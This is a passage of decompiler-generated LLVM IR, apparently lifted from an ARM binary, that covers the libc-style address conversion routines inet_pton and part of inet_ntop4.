  %v3_1b5c4 = zext i8 %v2_1b5c4 to i32
  store i32 %v3_1b5c4, i32* @r3, align 4
  %v2_1b5c8 = icmp eq i8 %v2_1b5c4, 0
  store i1 %v2_1b5c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b5c8, label %dec_label_pc_1b5c4.dec_label_pc_1b5d4_crit_edge, label %dec_label_pc_1b564

dec_label_pc_1b5c4.dec_label_pc_1b5d4_crit_edge:  ; preds = %dec_label_pc_1b5c4.backedge
  %v0_1b5d4.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_1b5d4

dec_label_pc_1b5d4:                               ; preds = %dec_label_pc_1b5c4.dec_label_pc_1b5d4_crit_edge, %entry
  %v0_1b5d4 = phi i32 [ %v0_1b5d4.pre, %dec_label_pc_1b5c4.dec_label_pc_1b5d4_crit_edge ], [ 0, %entry ]
  %v7_1b5d4 = icmp eq i32 %v0_1b5d4, 3
  store i1 %v7_1b5d4, i1* %cpsr_z.global-to-local, align 1
  %v7_1b5d8 = icmp slt i32 %v0_1b5d4, 4
  br i1 %v7_1b5d8, label %dec_label_pc_1b5f8, label %dec_label_pc_1b5dc

dec_label_pc_1b5dc:                               ; preds = %dec_label_pc_1b5d4
  %v0_1b5dc = load i32, i32* @r4, align 4
  store i32 %v0_1b5dc, i32* @r0, align 4
  store i32 %v2_1b54c, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_1b5e8 = call i32 @memcpy()
  br label %dec_label_pc_1b5f8

dec_label_pc_1b5f8:                               ; preds = %dec_label_pc_1b570, %dec_label_pc_1b58c, %dec_label_pc_1b5a0, %dec_label_pc_1b5b8, %dec_label_pc_1b5d4, %dec_label_pc_1b5dc
  %storemerge = phi i32 [ 1, %dec_label_pc_1b5dc ], [ 0, %dec_label_pc_1b5d4 ], [ 0, %dec_label_pc_1b5b8 ], [ 0, %dec_label_pc_1b5a0 ], [ 0, %dec_label_pc_1b58c ], [ 0, %dec_label_pc_1b570 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v3_1b534, i32* @r4, align 4
  store i32 %v6_1b534, i32* @r5, align 4
  store i32 %v15_1b534, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1b5d4, { 1, 0 }
  uselistorder i32 %v3_1b5c4, { 2, 1, 0 }
  uselistorder i32 %v0_1b5c4, { 1, 0 }
  uselistorder i32 %storemerge12, { 1, 0 }
  uselistorder i32 %v2_1b574, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_1b5f8, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1b5c4.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1b564, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_1b604 = load i32, i32* @r4, align 4
  %v6_1b604 = load i32, i32* @r5, align 4
  %v9_1b604 = load i32, i32* @r6, align 4
  %v12_1b604 = load i32, i32* @r7, align 4
  %v27_1b604 = load i32, i32* @lr, align 4
  %v7_1b610 = icmp eq i32 %arg1, 2
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  br i1 %v7_1b610, label %dec_label_pc_1b630, label %dec_label_pc_1b624

dec_label_pc_1b624:                               ; preds = %entry
  %v7_1b624 = icmp eq i32 %arg1, 10
  br i1 %v7_1b624, label %dec_label_pc_1b640, label %dec_label_pc_1b7f8

dec_label_pc_1b630:                               ; preds = %entry
  store i32 %tmp, i32* @r0, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v3_1b638 = call i32 @inet_pton4(i32 %tmp, i32 %arg3)
  br label %dec_label_pc_1b808

dec_label_pc_1b640:                               ; preds = %dec_label_pc_1b624
  %v2_1b640 = ptrtoint i32* %stack_var_-56 to i32
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 16, i32* @r2, align 4
  %v2_1b64c = bitcast i32* %stack_var_-56 to i8*
  %v3_1b64c = call i32 @__GI_memset(i8* %v2_1b64c, i32 0)
  %v0_1b650 = load i32, i32* @r5, align 4
  %v1_1b650 = inttoptr i32 %v0_1b650 to i8*
  %v2_1b650 = load i8, i8* %v1_1b650, align 1
  %v3_1b650 = zext i8 %v2_1b650 to i32
  store i32 %v3_1b650, i32* %r3.global-to-local, align 4
  %v7_1b654 = icmp eq i8 %v2_1b650, 58
  store i32 %v3_1b64c, i32* @r6, align 4
  %v2_1b65c = add i32 %v3_1b64c, 16
  store i32 %v2_1b65c, i32* %r8.global-to-local, align 4
  br i1 %v7_1b654, label %dec_label_pc_1b664, label %dec_label_pc_1b670

dec_label_pc_1b664:                               ; preds = %dec_label_pc_1b640
  %v1_1b664 = add i32 %v0_1b650, 1
  %v2_1b664 = inttoptr i32 %v1_1b664 to i8*
  %v3_1b664 = load i8, i8* %v2_1b664, align 1
  %v4_1b664 = zext i8 %v3_1b664 to i32
  store i32 %v4_1b664, i32* %r3.global-to-local, align 4
  store i32 %v1_1b664, i32* @r5, align 4
  %v7_1b668 = icmp eq i8 %v3_1b664, 58
  br i1 %v7_1b668, label %dec_label_pc_1b670, label %dec_label_pc_1b7f0

dec_label_pc_1b670:                               ; preds = %dec_label_pc_1b664, %dec_label_pc_1b640
  %v0_1b67c = phi i32 [ %v1_1b664, %dec_label_pc_1b664 ], [ %v0_1b650, %dec_label_pc_1b640 ]
  store i32 -32952, i32* @r3, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v0_1b678 = load i32, i32* @r4, align 4
  %v2_1b678 = add i32 %v0_1b678, -32952
  store i32 %v0_1b67c, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  store i32 %v2_1b678, i32* %stack_var_-64, align 4
  %v1_1b7543 = inttoptr i32 %v0_1b67c to i8*
  %v2_1b7544 = load i8, i8* %v1_1b7543, align 1
  %v3_1b7545 = zext i8 %v2_1b7544 to i32
  store i32 %v3_1b7545, i32* @r4, align 4
  %v2_1b7586 = icmp eq i8 %v2_1b7544, 0
  br i1 %v2_1b7586, label %dec_label_pc_1b760.thread, label %dec_label_pc_1b690

dec_label_pc_1b760.thread:                        ; preds = %dec_label_pc_1b670
  store i32 %v3_1b64c, i32* @r4, align 4
  br label %dec_label_pc_1b78c

dec_label_pc_1b690:                               ; preds = %dec_label_pc_1b670, %dec_label_pc_1b754.backedge.dec_label_pc_1b690_crit_edge
  %v0_1b694 = phi i32 [ %v3_1b754, %dec_label_pc_1b754.backedge.dec_label_pc_1b690_crit_edge ], [ %v3_1b7545, %dec_label_pc_1b670 ]
  %v2_1b690 = phi i32 [ %v2_1b690.pre, %dec_label_pc_1b754.backedge.dec_label_pc_1b690_crit_edge ], [ %v2_1b678, %dec_label_pc_1b670 ]
  store i32 %v2_1b690, i32* @r0, align 4
  %v1_1b694 = or i32 %v0_1b694, 32
  store i32 %v1_1b694, i32* %r1.global-to-local, align 4
  %v2_1b698 = call i32 @__GI_strchr(i32 %v2_1b690, i32 %v1_1b694)
  %v2_1b69c = icmp eq i32 %v2_1b698, 0
  %v0_1b6a0 = load i32, i32* @r5, align 4
  %v1_1b6a0 = add i32 %v0_1b6a0, 1
  store i32 %v1_1b6a0, i32* @r5, align 4
  br i1 %v2_1b69c, label %dec_label_pc_1b6c4, label %dec_label_pc_1b6a8

dec_label_pc_1b6a8:                               ; preds = %dec_label_pc_1b690
  %v2_1b6a8 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_1b6a8, i32* %r2.global-to-local, align 4
  %v2_1b6ac = sub i32 %v2_1b698, %v2_1b6a8
  %v1_1b6b0 = load i32, i32* @r7, align 4
  %v4_1b6b0 = mul i32 %v1_1b6b0, 16
  %v5_1b6b0 = or i32 %v4_1b6b0, %v2_1b6ac
  store i32 %v5_1b6b0, i32* @r7, align 4
  store i32 65535, i32* @r3, align 4
  %tmp36 = icmp ult i32 %v5_1b6b0, 65536
  br i1 %tmp36, label %dec_label_pc_1b750, label %dec_label_pc_1b7f0

dec_label_pc_1b6c4:                               ; preds = %dec_label_pc_1b690
  %v0_1b6c4 = load i32, i32* @r4, align 4
  %v7_1b6c4 = icmp eq i32 %v0_1b6c4, 58
  br i1 %v7_1b6c4, label %dec_label_pc_1b6cc, label %dec_label_pc_1b724

dec_label_pc_1b6cc:                               ; preds = %dec_label_pc_1b6c4
  %v0_1b6cc = load i32, i32* %sb.global-to-local, align 4
  %v2_1b6cc = icmp eq i32 %v0_1b6cc, 0
  br i1 %v2_1b6cc, label %dec_label_pc_1b6d4, label %dec_label_pc_1b6e8

dec_label_pc_1b6d4:                               ; preds = %dec_label_pc_1b6cc
  %v0_1b6d4 = load i32, i32* %fp.global-to-local, align 4
  %v2_1b6d4 = icmp eq i32 %v0_1b6d4, 0
  br i1 %v2_1b6d4, label %dec_label_pc_1b6dc, label %dec_label_pc_1b7f0

dec_label_pc_1b6dc:                               ; preds = %dec_label_pc_1b6d4
  %v0_1b6dc = load i32, i32* @r6, align 4
  store i32 %v0_1b6dc, i32* %fp.global-to-local, align 4
  store i32 %v1_1b6a0, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1b754.backedge

dec_label_pc_1b6e8:                               ; preds = %dec_label_pc_1b6cc
  %v1_1b6e8 = inttoptr i32 %v1_1b6a0 to i8*
  %v2_1b6e8 = load i8, i8* %v1_1b6e8, align 1
  %v3_1b6e8 = zext i8 %v2_1b6e8 to i32
  store i32 %v3_1b6e8, i32* %r3.global-to-local, align 4
  %v2_1b6ec = icmp eq i8 %v2_1b6e8, 0
  br i1 %v2_1b6ec, label %dec_label_pc_1b7f0, label %dec_label_pc_1b6f4

dec_label_pc_1b6f4:                               ; preds = %dec_label_pc_1b6e8
  %v0_1b6f4 = load i32, i32* @r6, align 4
  %v1_1b6f4 = add i32 %v0_1b6f4, 2
  store i32 %v1_1b6f4, i32* %r3.global-to-local, align 4
  %v1_1b6f8 = load i32, i32* %r8.global-to-local, align 4
  %tmp37 = icmp ugt i32 %v1_1b6f4, %v1_1b6f8
  br i1 %tmp37, label %dec_label_pc_1b7f0, label %dec_label_pc_1b700

dec_label_pc_1b700:                               ; preds = %dec_label_pc_1b6f4
  %v0_1b700 = load i32, i32* @r7, align 4
  %v3_1b700 = udiv i32 %v0_1b700, 256
  store i32 %v3_1b700, i32* %r2.global-to-local, align 4
  store i32 %v0_1b6f4, i32* %r3.global-to-local, align 4
  %v1_1b708 = trunc i32 %v3_1b700 to i8
  %v3_1b708 = inttoptr i32 %v0_1b6f4 to i8*
  store i8 %v1_1b708, i8* %v3_1b708, align 1
  %v4_1b708 = load i32, i32* %r3.global-to-local, align 4
  %v5_1b708 = add i32 %v4_1b708, 1
  store i32 %v5_1b708, i32* @r3, align 4
  %v0_1b70c = load i32, i32* @r7, align 4
  %v1_1b70c = trunc i32 %v0_1b70c to i8
  %v2_1b70c = load i32, i32* @r6, align 4
  %v3_1b70c = add i32 %v2_1b70c, 1
  %v4_1b70c = inttoptr i32 %v3_1b70c to i8*
  store i8 %v1_1b70c, i8* %v4_1b70c, align 1
  store i32 0, i32* @r7, align 4
  %v0_1b714 = load i32, i32* @r3, align 4
  %v1_1b714 = add i32 %v0_1b714, 1
  store i32 %v1_1b714, i32* @r6, align 4
  %v0_1b718 = load i32, i32* @r5, align 4
  store i32 %v0_1b718, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1b754.backedge

dec_label_pc_1b724:                               ; preds = %dec_label_pc_1b6c4
  %v7_1b724 = icmp eq i32 %v0_1b6c4, 46
  br i1 %v7_1b724, label %dec_label_pc_1b72c, label %dec_label_pc_1b7f0

dec_label_pc_1b72c:                               ; preds = %dec_label_pc_1b724
  %v0_1b72c = load i32, i32* @r6, align 4
  %v1_1b72c = add i32 %v0_1b72c, 4
  store i32 %v1_1b72c, i32* @r4, align 4
  %v1_1b730 = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_1b72c, %v1_1b730
  br i1 %tmp38, label %dec_label_pc_1b7f0, label %dec_label_pc_1b738

dec_label_pc_1b738:                               ; preds = %dec_label_pc_1b72c
  %v0_1b738 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_1b738, i32* @r0, align 4
  store i32 %v0_1b72c, i32* %r1.global-to-local, align 4
  %v3_1b740 = call i32 @inet_pton4(i32 %v0_1b738, i32 %v0_1b72c)
  %v5_1b748 = icmp sgt i32 %v3_1b740, 0
  br i1 %v5_1b748, label %dec_label_pc_1b738.dec_label_pc_1b78c_crit_edge, label %dec_label_pc_1b7f0

dec_label_pc_1b738.dec_label_pc_1b78c_crit_edge:  ; preds = %dec_label_pc_1b738
  %v0_1b7d0.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1b78c

dec_label_pc_1b750:                               ; preds = %dec_label_pc_1b6a8
  store i32 1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1b754.backedge

dec_label_pc_1b754.backedge:                      ; preds = %dec_label_pc_1b750, %dec_label_pc_1b6dc, %dec_label_pc_1b700
  %v0_1b754 = phi i32 [ %v1_1b6a0, %dec_label_pc_1b750 ], [ %v1_1b6a0, %dec_label_pc_1b6dc ], [ %v0_1b718, %dec_label_pc_1b700 ]
  %v0_1b76012 = phi i32 [ 1, %dec_label_pc_1b750 ], [ 0, %dec_label_pc_1b6dc ], [ 0, %dec_label_pc_1b700 ]
  %v1_1b754 = inttoptr i32 %v0_1b754 to i8*
  %v2_1b754 = load i8, i8* %v1_1b754, align 1
  %v3_1b754 = zext i8 %v2_1b754 to i32
  store i32 %v3_1b754, i32* @r4, align 4
  %v2_1b758 = icmp eq i8 %v2_1b754, 0
  br i1 %v2_1b758, label %dec_label_pc_1b760, label %dec_label_pc_1b754.backedge.dec_label_pc_1b690_crit_edge

dec_label_pc_1b754.backedge.dec_label_pc_1b690_crit_edge: ; preds = %dec_label_pc_1b754.backedge
  %v2_1b690.pre = load i32, i32* %stack_var_-64, align 4
  br label %dec_label_pc_1b690

dec_label_pc_1b760:                               ; preds = %dec_label_pc_1b754.backedge
  %v0_1b764.pre = load i32, i32* @r6, align 4
  %v2_1b760 = icmp eq i32 %v0_1b76012, 0
  store i32 %v0_1b764.pre, i32* @r4, align 4
  br i1 %v2_1b760, label %dec_label_pc_1b78c, label %dec_label_pc_1b76c

dec_label_pc_1b76c:                               ; preds = %dec_label_pc_1b760
  %v1_1b76c = add i32 %v0_1b764.pre, 2
  store i32 %v1_1b76c, i32* %r3.global-to-local, align 4
  %v1_1b770 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_1b76c, %v1_1b770
  br i1 %tmp39, label %dec_label_pc_1b7f0, label %dec_label_pc_1b778

dec_label_pc_1b778:                               ; preds = %dec_label_pc_1b76c
  store i32 %v0_1b764.pre, i32* %r3.global-to-local, align 4
  %v0_1b77c = load i32, i32* @r7, align 4
  %v3_1b77c = udiv i32 %v0_1b77c, 256
  store i32 %v3_1b77c, i32* %r2.global-to-local, align 4
  %v1_1b780 = trunc i32 %v3_1b77c to i8
  %v3_1b780 = inttoptr i32 %v0_1b764.pre to i8*
  store i8 %v1_1b780, i8* %v3_1b780, align 1
  %v4_1b780 = load i32, i32* %r3.global-to-local, align 4
  %v5_1b780 = add i32 %v4_1b780, 1
  store i32 %v5_1b780, i32* @r3, align 4
  %v0_1b784 = load i32, i32* @r7, align 4
  %v1_1b784 = trunc i32 %v0_1b784 to i8
  %v2_1b784 = load i32, i32* @r6, align 4
  %v3_1b784 = add i32 %v2_1b784, 1
  %v4_1b784 = inttoptr i32 %v3_1b784 to i8*
  store i8 %v1_1b784, i8* %v4_1b784, align 1
  %v0_1b788 = load i32, i32* @r3, align 4
  %v1_1b788 = add i32 %v0_1b788, 1
  store i32 %v1_1b788, i32* @r4, align 4
  br label %dec_label_pc_1b78c

dec_label_pc_1b78c:                               ; preds = %dec_label_pc_1b738.dec_label_pc_1b78c_crit_edge, %dec_label_pc_1b760.thread, %dec_label_pc_1b760, %dec_label_pc_1b778
  %v0_1b7d0.pre = phi i32 [ %v0_1b7d0.pre.pre, %dec_label_pc_1b738.dec_label_pc_1b78c_crit_edge ], [ %v3_1b64c, %dec_label_pc_1b760.thread ], [ %v0_1b764.pre, %dec_label_pc_1b760 ], [ %v1_1b788, %dec_label_pc_1b778 ]
  %v0_1b78c = load i32, i32* %fp.global-to-local, align 4
  %v2_1b78c = icmp eq i32 %v0_1b78c, 0
  %v1_1b7d0.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_1b78c, label %dec_label_pc_1b7d0, label %dec_label_pc_1b794

dec_label_pc_1b794:                               ; preds = %dec_label_pc_1b78c
  %v9_1b794 = icmp eq i32 %v0_1b7d0.pre, %v1_1b7d0.pre
  %v2_1b798 = sub i32 %v0_1b7d0.pre, %v0_1b78c
  store i32 %v2_1b798, i32* @ip, align 4
  br i1 %v9_1b794, label %dec_label_pc_1b7f0, label %dec_label_pc_1b7b8.preheader

dec_label_pc_1b7b8.preheader:                     ; preds = %dec_label_pc_1b794
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_1b7b8

dec_label_pc_1b7ac:                               ; preds = %dec_label_pc_1b7b8
  %v2_1b7c0 = sub i32 %v0_1b7cc, %v0_1b7c4
  %v0_1b7ac = load i32, i32* %fp.global-to-local, align 4
  %v2_1b7ac = add i32 %v0_1b7ac, %v2_1b7bc
  %v3_1b7ac = inttoptr i32 %v2_1b7ac to i8*
  %v4_1b7ac = load i8, i8* %v3_1b7ac, align 1
  %v6_1b7ac = zext i8 %v4_1b7ac to i32
  store i32 %v6_1b7ac, i32* @r3, align 4
  %v3_1b7b0 = inttoptr i32 %v2_1b7c0 to i8*
  store i8 %v4_1b7ac, i8* %v3_1b7b0, align 1
  %v0_1b7b4 = load i32, i32* @lr, align 4
  %v1_1b7b4 = trunc i32 %v0_1b7b4 to i8
  %v2_1b7b4 = load i32, i32* %fp.global-to-local, align 4
  %v3_1b7b4 = load i32, i32* %r1.global-to-local, align 4
  %v4_1b7b4 = add i32 %v3_1b7b4, %v2_1b7b4
  %v5_1b7b4 = inttoptr i32 %v4_1b7b4 to i8*
  store i8 %v1_1b7b4, i8* %v5_1b7b4, align 1
  %v0_1b7b8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1b7b8.pre = load i32, i32* @ip, align 4
  %v1_1b7c0.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1b7b8

dec_label_pc_1b7b8:                               ; preds = %dec_label_pc_1b7b8.preheader, %dec_label_pc_1b7ac
  %v0_1b7cc = phi i32 [ %v1_1b7d0.pre, %dec_label_pc_1b7b8.preheader ], [ %v1_1b7c0.pre, %dec_label_pc_1b7ac ]
  %v1_1b7bc = phi i32 [ %v2_1b798, %dec_label_pc_1b7b8.preheader ], [ %v1_1b7b8.pre, %dec_label_pc_1b7ac ]
  %v0_1b7c4 = phi i32 [ 1, %dec_label_pc_1b7b8.preheader ], [ %v0_1b7b8.pre, %dec_label_pc_1b7ac ]
  %v2_1b7b8 = sub i32 %v0_1b7c4, %v1_1b7bc
  %v4_1b7b8 = xor i32 %v0_1b7c4, %v1_1b7bc
  %v5_1b7b8 = xor i32 %v2_1b7b8, %v0_1b7c4
  %v6_1b7b8 = and i32 %v5_1b7b8, %v4_1b7b8
  %v7_1b7b8 = icmp slt i32 %v6_1b7b8, 0
  %v8_1b7b8 = icmp slt i32 %v2_1b7b8, 0
  %v9_1b7b8 = icmp eq i32 %v0_1b7c4, %v1_1b7bc
  %v2_1b7bc = sub i32 %v1_1b7bc, %v0_1b7c4
  store i32 %v2_1b7bc, i32* %r1.global-to-local, align 4
  %v1_1b7c4 = add i32 %v0_1b7c4, 1
  store i32 %v1_1b7c4, i32* %r2.global-to-local, align 4
  %v3_1b7c8 = xor i1 %v8_1b7b8, %v7_1b7b8
  %v4_1b7c8 = or i1 %v9_1b7b8, %v3_1b7c8
  br i1 %v4_1b7c8, label %dec_label_pc_1b7ac, label %dec_label_pc_1b7cc

dec_label_pc_1b7cc:                               ; preds = %dec_label_pc_1b7b8
  store i32 %v0_1b7cc, i32* @r4, align 4
  br label %dec_label_pc_1b7d0

dec_label_pc_1b7d0:                               ; preds = %dec_label_pc_1b78c, %dec_label_pc_1b7cc
  %v0_1b7d0 = phi i32 [ %v0_1b7cc, %dec_label_pc_1b7cc ], [ %v0_1b7d0.pre, %dec_label_pc_1b78c ]
  %v1_1b7d0 = phi i32 [ %v0_1b7cc, %dec_label_pc_1b7cc ], [ %v1_1b7d0.pre, %dec_label_pc_1b78c ]
  %v9_1b7d0 = icmp eq i32 %v0_1b7d0, %v1_1b7d0
  br i1 %v9_1b7d0, label %dec_label_pc_1b7d8, label %dec_label_pc_1b7f0

dec_label_pc_1b7d8:                               ; preds = %dec_label_pc_1b7d0
  store i32 %arg3, i32* @r0, align 4
  store i32 %v2_1b640, i32* @r1, align 4
  store i32 16, i32* @r2, align 4
  %v0_1b7e4 = call i32 @memcpy()
  br label %dec_label_pc_1b808

dec_label_pc_1b7f0:                               ; preds = %dec_label_pc_1b6a8, %dec_label_pc_1b6d4, %dec_label_pc_1b6f4, %dec_label_pc_1b6e8, %dec_label_pc_1b794, %dec_label_pc_1b738, %dec_label_pc_1b724, %dec_label_pc_1b7d0, %dec_label_pc_1b664, %dec_label_pc_1b76c, %dec_label_pc_1b72c
  br label %dec_label_pc_1b808

dec_label_pc_1b7f8:                               ; preds = %dec_label_pc_1b624
  %v0_1b7f8 = call i32 @__GI___errno_location()
  store i32 97, i32* %r3.global-to-local, align 4
  %v2_1b800 = inttoptr i32 %v0_1b7f8 to i32*
  store i32 97, i32* %v2_1b800, align 4
  br label %dec_label_pc_1b808

dec_label_pc_1b808:                               ; preds = %dec_label_pc_1b7f0, %dec_label_pc_1b7d8, %dec_label_pc_1b630, %dec_label_pc_1b7f8
  %v1_1b810 = phi i32 [ 0, %dec_label_pc_1b7f0 ], [ 1, %dec_label_pc_1b7d8 ], [ %v3_1b638, %dec_label_pc_1b630 ], [ -1, %dec_label_pc_1b7f8 ]
  store i32 %v3_1b604, i32* @r4, align 4
  store i32 %v6_1b604, i32* @r5, align 4
  store i32 %v9_1b604, i32* @r6, align 4
  store i32 %v12_1b604, i32* @r7, align 4
  store i32 %v27_1b604, i32* @lr, align 4
  ret i32 %v1_1b810

; uselistorder directives
  uselistorder i32 %v2_1b7bc, { 1, 0 }
  uselistorder i32 %v2_1b7b8, { 1, 0 }
  uselistorder i32 %v0_1b7c4, { 2, 3, 6, 0, 1, 5, 4 }
  uselistorder i32 %v1_1b7bc, { 1, 3, 0, 2 }
  uselistorder i32 %v0_1b7cc, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1b7d0.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1b7d0.pre, { 2, 0, 1 }
  uselistorder i32 %v3_1b77c, { 1, 0 }
  uselistorder i32 %v0_1b764.pre, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v3_1b754, { 1, 0 }
  uselistorder i32 %v0_1b72c, { 1, 0, 2 }
  uselistorder i32 %v3_1b700, { 1, 0 }
  uselistorder i32 %v0_1b6f4, { 1, 0, 2 }
  uselistorder i32 %v1_1b6a0, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_1b690, { 1, 0 }
  uselistorder i32 %v0_1b67c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 (i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1b808, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1b7f0, { 7, 4, 9, 5, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_1b7d0, { 1, 0 }
  uselistorder label %dec_label_pc_1b7b8, { 1, 0 }
  uselistorder label %dec_label_pc_1b78c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1b754.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1b690, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-57 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-72, align 4
  store i32 0, i32* %stack_var_-57, align 4
  %v2_1b8f8 = ptrtoint i32* %stack_var_-40 to i32
  %v2_1b8d8 = add i32 %v2_1b8f8, -17
  br label %dec_label_pc_1b8f8

dec_label_pc_1b848:                               ; preds = %dec_label_pc_1b8f8
  %v0_1b848 = load i32, i32* %fp.global-to-local, align 4
  %v2_1b848 = add i32 %v0_1b848, %v1_1b848
  %v3_1b848 = inttoptr i32 %v2_1b848 to i8*
  %v4_1b848 = load i8, i8* %v3_1b848, align 1
  %v6_1b848 = zext i8 %v4_1b848 to i32
  store i32 %v6_1b848, i32* %r4.global-to-local, align 4
  %div4 = udiv i8 %v4_1b848, 100
  %v2_1b850 = zext i8 %div4 to i32
  store i32 %v2_1b850, i32* %r0.global-to-local, align 4
  %v1_1b854 = or i8 %div4, 48
  %v3_1b858 = add i32 %v2_1b908, -17
  %v4_1b858 = inttoptr i32 %v3_1b858 to i8*
  store i8 %v1_1b854, i8* %v4_1b858, align 1
  %v0_1b85c = load i32, i32* %r5.global-to-local, align 4
  %v1_1b85c = add i32 %v0_1b85c, -17
  %v2_1b85c = inttoptr i32 %v1_1b85c to i8*
  %v3_1b85c = load i8, i8* %v2_1b85c, align 1
  %v0_1b860 = load i32, i32* %r6.global-to-local, align 4
  %v1_1b860 = add i32 %v0_1b860, 1
  store i32 %v1_1b860, i32* %r6.global-to-local, align 4
  store i32 %v2_1b8f8, i32* %r2.global-to-local, align 4
  %v7_1b868 = icmp eq i8 %v3_1b85c, 48
  %v0_1b870 = load i32, i32* %r4.global-to-local, align 4
  %v0_1b878 = load i32, i32* %fp.global-to-local, align 4
  %v1_1b878 = load i32, i32* %sl.global-to-local, align 4
  %v2_1b878 = add i32 %v1_1b878, %v0_1b878
  store i32 %v2_1b878, i32* %sb.global-to-local, align 4
  %v2_1b880 = udiv i32 %v0_1b870, 10
  %v1_1b888 = urem i32 %v2_1b880, 256
  %v2_1b88c = udiv i32 %v1_1b888, 10
  %v3_1b88c = urem i32 %v1_1b888, 10
  store i32 %v2_1b88c, i32* %r0.global-to-local, align 4
  %v1_1b890 = or i32 %v3_1b88c, 48
  br i1 %v7_1b868, label %dec_label_pc_1b880, label %dec_label_pc_1b8a8

dec_label_pc_1b880:                               ; preds = %dec_label_pc_1b848
  %v7_1b898 = icmp eq i32 %v1_1b890, 48
  br i1 %v7_1b898, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_1b880
  store i32 %v1_1b860, i32* %r7.global-to-local, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_1b880, %bb
  %v1_1b8a0 = trunc i32 %v1_1b890 to i8
  store i8 %v1_1b8a0, i8* %v2_1b85c, align 1
  %v0_1b8d4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1b8c4

dec_label_pc_1b8a8:                               ; preds = %dec_label_pc_1b848
  %v2_1b874 = add i32 %v1_1b860, %v2_1b8f8
  %v1_1b8bc = trunc i32 %v1_1b890 to i8
  %v3_1b8bc = add i32 %v2_1b874, -17
  %v4_1b8bc = inttoptr i32 %v3_1b8bc to i8*
  store i8 %v1_1b8bc, i8* %v4_1b8bc, align 1
  %v0_1b8c0 = load i32, i32* %r6.global-to-local, align 4
